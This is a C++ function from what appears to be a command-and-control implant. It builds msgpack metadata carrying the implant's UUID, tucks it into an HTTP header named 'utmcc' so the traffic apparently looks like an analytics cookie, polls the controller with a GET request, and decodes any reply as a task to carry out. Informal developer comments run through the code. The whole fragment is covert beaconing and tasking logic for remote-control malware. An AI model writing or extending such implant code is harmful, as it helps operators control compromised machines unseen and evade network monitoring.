nlohmann::json get(std::string implant_uuid) {
    //note, pass a copy of implant_uuid in, as we are going to be potentialyl heavily editing it. 

    std::vector<uint8_t> http_response_buffer;

    //[TEMPLATE ME] //temp use of headers, matching test mc2 profile. 
    // Define headers (No \r\n needed)

    //create metadata
    std::map<std::string, std::string> metadata;
    metadata["implant_uuid"] = implant_uuid;

    std::vector<uint8_t> metadata_as_msgpack;
    create_metadata(metadata, metadata_as_msgpack);

    //hold bytes in string, as all the transforsm want a string
    std::string payload(metadata_as_msgpack.begin(), metadata_as_msgpack.end());

    std::vector<std::wstring> headers;



    //bsae64 encode the implant_uuid
    //base64_encode_inplace(payload); //this should be metadata buffer

    headers.push_back(L"utmcc: " + std::wstring(payload.begin(), payload.end()));



    if (HTTP_GET(headers, http_response_buffer)) {
        // Check if buffer is empty before decoding
        if (http_response_buffer.empty()) {
            return nullptr;
        }
        std::cout << "Success! Bytes read: " << http_response_buffer.size() << std::endl;
        nlohmann::json task_data = decode_msgpack_task(http_response_buffer);
        return task_data;

    }
    //could also check for 204, maybe do that at the HTTP_GET func level. For now, if no task/no body, it says no task and sleeps
    else {
        
        std::cerr << "Request failed." << std::endl;
        return nullptr;
    }


    return nullptr;
}